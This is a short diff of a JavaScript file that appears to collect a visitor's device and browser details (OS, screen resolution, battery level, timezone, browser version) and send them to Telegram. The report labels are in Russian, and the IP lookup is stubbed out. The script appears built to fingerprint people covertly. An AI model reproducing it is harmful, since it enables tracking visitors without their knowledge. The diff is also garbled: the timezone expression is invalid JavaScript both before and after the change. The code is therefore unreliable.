@@ -22,7 +22,7 @@
 async function getIPAddress() {
     // const response = await fetch('https://api.ipify.org?format=json');
     // const data = await response.json();
-    return "undefiend";
+    return `undefiend`;
 }
 
 function getUserAgent() {
@@ -75,7 +75,7 @@ async function sendDataToTelegram() {
 ├ Имя ОС: <code>${osName}</code>
 ├ Разрешение экрана: <code>${screenResolution}</code>
 ├ Процент батареи: <code>${batteryPercentage}%</code>
-└ Часовой пояс: <code>${new (Date().getTimezoneOffset()/60)*-1}</code>
+└ Часовой пояс: <code>${new (Date().getTimezoneOffset()}</code>
 <b>🌐 Информация о браузере:</b>
 ├ Название браузера: <code>${browserInfo.name}</code>
 ├ Версия браузера: <code>${browserInfo.version}</code>
